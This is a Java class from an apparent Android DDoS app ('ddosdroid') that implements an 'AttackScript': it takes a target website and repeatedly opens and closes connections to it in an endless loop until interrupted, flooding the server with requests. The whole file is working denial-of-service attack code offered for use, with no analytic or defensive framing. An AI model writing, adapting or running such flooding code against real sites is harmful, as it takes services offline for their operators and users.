package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.service;

import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;

public class AttackScript implements Runnable {
    private static final String TAG = "AttackScript";
    private URL url;

    public AttackScript(String website) {
        this.url = createUrl(website);
    }

    private URL createUrl(String website) {
        URL url = null;
        try {
            url = new URL(website);
        } catch (MalformedURLException e) {
            Log.e(TAG, "Wrong url?", e);
        }
        return url;
    }

    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            read(url);
        }
        Log.d(TAG, "Stopped requesting from " + url + " server.");
    }

    private void read(URL url) {
        InputStream in = null;
        try {
            in = url.openStream();
            Log.d(TAG, "Read from " + url);
        } catch (IOException e) {
            Log.e(TAG, "openStream() error.", e);
        } finally {
            closeInputStream(in);
        }
    }

    private void closeInputStream(InputStream in) {
        try {
            in.close();
            Log.d(TAG, "InputStream closed for " + url);
        } catch (IOException e) {
            Log.e(TAG, "Error while closing the input stream.", e);
        }
    }
}
